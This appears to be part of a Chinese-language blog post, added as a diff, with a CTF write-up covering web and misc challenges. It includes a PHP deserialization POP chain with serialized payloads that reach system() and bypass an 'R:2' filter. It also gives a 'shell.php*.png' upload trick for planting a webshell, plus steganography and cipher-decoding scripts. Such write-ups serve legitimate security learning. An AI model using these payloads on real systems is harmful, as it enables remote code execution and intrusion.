+        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">flag1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"paluctf"</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre>
+<p>在&#x2F;路由里面,会进行一个get请求，如果响应包里面包含<code>paluctf</code>就会返回flag，正好<code>/flag</code>路由回返回<code>paluctf</code>字符串，那么直接<code>url=http://localhost/flag</code>拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/Op1eAt.png" alt="Op1eAt.png" loading="lazy"></p>
+<h2 id="R23"><a href="#R23" class="headerlink" title="R23"></a>R23</h2><p><img src="https://ooo.0x0.ooo/2024/04/22/Op1rSx.png" alt="Op1rSx.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+show_source<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+class a<span class="token punctuation">&#123;</span>
+    public <span class="token keyword">function</span> __get<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span>-<span class="token operator">></span>b-<span class="token operator">></span>love<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+class b<span class="token punctuation">&#123;</span>
+    public <span class="token keyword">function</span> <span class="token function-name function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$this</span>-<span class="token operator">></span>c-<span class="token operator">></span>name<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    public <span class="token keyword">function</span> <span class="token function-name function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span>-<span class="token operator">></span>c <span class="token operator">=</span> <span class="token string">"no!"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span>-<span class="token operator">></span>b <span class="token operator">=</span> <span class="token variable">$this</span>-<span class="token operator">></span>a<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+class xk<span class="token punctuation">&#123;</span>
+    public <span class="token keyword">function</span> <span class="token function-name function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+       system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/R:2|R:3/'</span>,<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">&#123;</span>
+    die<span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+unserialize<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
+<p>入口一看就是b类,__wakeup-&gt;__destruct-&gt;__get-&gt;love<br>所以初步构造是</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:2;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:2:"xk":0:&#123;&#125;&#125;&#125;</span></code></pre>
+<p>但是题目不能出现R:2，发现套个数组并且加个无用数据会变成R:4</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//a:2:&#123;i:0;s:1:"1";i:1;O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:4;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:2:"xk":0:&#123;&#125;&#125;&#125;&#125;</span></code></pre>
+<p>拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNAtU.png" alt="OpNAtU.png" loading="lazy"><br>查看源码就有flag</p>
+<h2 id="宇宙召唤"><a href="#宇宙召唤" class="headerlink" title="宇宙召唤"></a>宇宙召唤</h2><blockquote>
+<p>来自宇宙深处的呼唤 似乎有个声音一直在你脑中重复 不要回复 不要回复 不要回复<br>又有一个距离你较近的声音重复 宇宙真理 42 42 42<br>你似乎想与它交流什么 你们的距离似乎很遥远 只能发送1024字节 不要让它失望 为什么不理解它的爱</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNKjY.png" alt="OpNKjY.png" loading="lazy"><br>根据描述只能上传1024kb的文件<br>上传一个超小的马看看<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNvWv.png" alt="OpNvWv.png" loading="lazy"><br>提示文件类型不对，但是无论修改啥类型，添加什么头，截断等等都传不上去<br>根据提示42 42 42 ，42对应的ascii字符是<code>*</code>，测试发现*可以截断文件名<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNygq.png" alt="OpNygq.png" loading="lazy"><br>改为<code>shell.php*.png</code>发现成功上传并且保留的是php的后缀<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNgsc.png" alt="OpNgsc.png" loading="lazy"><br>成功rce拿到flag</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc-签到"></a>Misc-签到</h2><pre class="language-none"><code class="language-none">27880
+30693
+25915
+21892
+38450
+23454
+39564
+23460
+21457
+36865
+112
+108
+98
+99
+116
+102
+33719
+21462
+21069
+27573
+102
+108
+97
+103
+20851
+27880
+79
+110
+101
+45
+70
+111
+120
+23433
+20840
+22242
+38431
+22238
+22797
+112
+108
+98
+99
+116
+102
+33719
+21462
+21518
+27573
+102
+108
+97
+103</code></pre>
+<p>给了一串数字，盲猜中文ascii码<br>写个py转化以下</p>
+<pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">30693</span><span class="token punctuation">,</span> <span class="token number">25915</span><span class="token punctuation">,</span> <span class="token number">21892</span><span class="token punctuation">,</span> <span class="token number">38450</span><span class="token punctuation">,</span> <span class="token number">23454</span><span class="token punctuation">,</span> <span class="token number">39564</span><span class="token punctuation">,</span> <span class="token number">23460</span><span class="token punctuation">,</span> <span class="token number">21457</span><span class="token punctuation">,</span> <span class="token number">36865</span><span class="token punctuation">,</span> 
+    <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> <span class="token number">21069</span><span class="token punctuation">,</span> <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> 
+    <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">20851</span><span class="token punctuation">,</span> <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">23433</span><span class="token punctuation">,</span> <span class="token number">20840</span><span class="token punctuation">,</span> 
+    <span class="token number">22242</span><span class="token punctuation">,</span> <span class="token number">38431</span><span class="token punctuation">,</span> <span class="token number">22238</span><span class="token punctuation">,</span> <span class="token number">22797</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> 
+    <span class="token number">21518</span><span class="token punctuation">,</span> <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span>
+
+chinese <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+        chinese <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>chinese<span class="token punctuation">)</span>
+<span class="token operator">//</span>注知攻善防实验室发送plbctf获取前段flag关注One<span class="token operator">-</span>Fox安全团队回复plbctf获取后段flag</code></pre>
+<h2 id="江"><a href="#江" class="headerlink" title="江"></a>江</h2><p>百度全景地图<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNPGG.png" alt="OpNPGG.png" loading="lazy"><br><code>flag&#123;湖北省武汉市江汉二路与江汉路步行街交叉路口&#125;</code></p>
+<h2 id="FM145-8"><a href="#FM145-8" class="headerlink" title="FM145.8"></a>FM145.8</h2><p>FM 一眼SSTV<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN4hI.jpg" alt="OpN4hI.jpg" loading="lazy"><br><code>flag&#123;19b4dD77bF3c66f91c23F5A25Bc314CB&#125;</code></p>
+<h2 id="ez-misc"><a href="#ez-misc" class="headerlink" title="ez_misc"></a>ez_misc</h2><p>ctf.jpg末尾有snow隐写<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNH2F.png" alt="OpNH2F.png" loading="lazy"><br>拿到密码<code>Carefree and carefree</code>,先修复以下压缩包然后打开压缩包拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNEW6.png" alt="OpNEW6.png" loading="lazy"></p>
+<h2 id="为什么我的新猫猫吃不饱"><a href="#为什么我的新猫猫吃不饱" class="headerlink" title="为什么我的新猫猫吃不饱"></a>为什么我的新猫猫吃不饱</h2><p><img src="https://ooo.0x0.ooo/2024/04/22/OpNGgP.png" alt="OpNGgP.png" loading="lazy"><br>010打开gif文件尾有个类似flag头的<code>UOZT&#123;NB_XZ1_</code>放到随波逐流里面梭哈<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNQVb.png" alt="OpNQVb.png" loading="lazy"><br>拿到flag头<code>flag&#123;my_ca1_</code><br>然后看png文件，发现左边缘有紫色的，大概率是盲水印了<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN0ol.png" alt="OpN0ol.png" loading="lazy"><br>在gif中分解出两个与png像的图片然后检测盲水印<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNcrg.png" alt="OpNcrg.png" loading="lazy"><br>第23帧与png及其相似<br>提取一下水印<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNs3s.png" alt="OpNs3s.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/22/OpNYiK.png" alt="OpNYiK.png" loading="lazy"><br>后半段,这字挺难认的<br><code>1s_Fu11&#125;</code>,最终flag<code>flag&#123;my_ca1_1s_Fu11&#125;</code><br>附带提取水印脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>
+<span class="token keyword">import</span> cv2
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParser
+ALPHA <span class="token operator">=</span> <span class="token number">5</span>
+
+
+<span class="token keyword">def</span> <span class="token function">build_parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--original'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'ori'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--image'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--result'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'res'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--alpha'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'alpha'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>ALPHA<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> parser
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parser <span class="token operator">=</span> build_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    ori <span class="token operator">=</span> options<span class="token punctuation">.</span>ori
+    img <span class="token operator">=</span> options<span class="token punctuation">.</span>img
+    res <span class="token operator">=</span> options<span class="token punctuation">.</span>res
+    alpha <span class="token operator">=</span> options<span class="token punctuation">.</span>alpha
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"original image %s does not exist."</span> <span class="token operator">%</span> ori<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"image %s does not exist."</span> <span class="token operator">%</span> img<span class="token punctuation">)</span>
+    decode<span class="token punctuation">(</span>ori<span class="token punctuation">,</span> img<span class="token punctuation">,</span> res<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>ori_path<span class="token punctuation">,</span> img_path<span class="token punctuation">,</span> res_path<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ori <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>ori_path<span class="token punctuation">)</span>
+    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>
+    ori_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>ori<span class="token punctuation">)</span>
+    img_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+    height<span class="token punctuation">,</span> width <span class="token operator">=</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    watermark <span class="token operator">=</span> <span class="token punctuation">(</span>ori_f <span class="token operator">-</span> img_f<span class="token punctuation">)</span> <span class="token operator">/</span> alpha
+    watermark <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>watermark<span class="token punctuation">)</span>
+    res <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>watermark<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>height <span class="token operator">+</span> width<span class="token punctuation">)</span>
+    x <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    y <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span>
+    x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+    y <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            res<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> watermark<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
+    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>res_path<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="350-350"><a href="#350-350" class="headerlink" title="350*350"></a>350*350</h2><p>拿到压缩包然后解压<br><img src="https://ooo.0x0.ooo/2024/04/23/Opyppj.png" alt="Opyppj.png" loading="lazy"><br>有一个图片 和一个压缩包<br>图片是key,对图片分析<br>用foremost新分离出来一个压缩包<br><img src="https://ooo.0x0.ooo/2024/04/23/OpytKY.png" alt="OpytKY.png" loading="lazy"><br>改后缀为doc发现零宽隐写<br><img src="https://ooo.0x0.ooo/2024/04/23/Opy40v.png" alt="Opy40v.png" loading="lazy"></p>
+<blockquote>
+<p>井兑未济大畜咸益升归妹旅中孚剥噬嗑小过中孚震归妹升兑艮随旅随蒙颐升益蛊颐咸涣豫兑咸观艮益升中孚复睽咸观解临旅涣噬嗑屯</p>
+</blockquote>
+<p>64卦加密，解密一下</p>
+<pre class="language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">'井兑未济大畜咸益升归妹旅中孚剥噬嗑小过中孚震归妹升兑艮随旅随蒙颐升益蛊颐咸涣豫兑咸观艮益升中孚复睽咸观解临旅涣噬嗑屯'</span>
+dic<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token 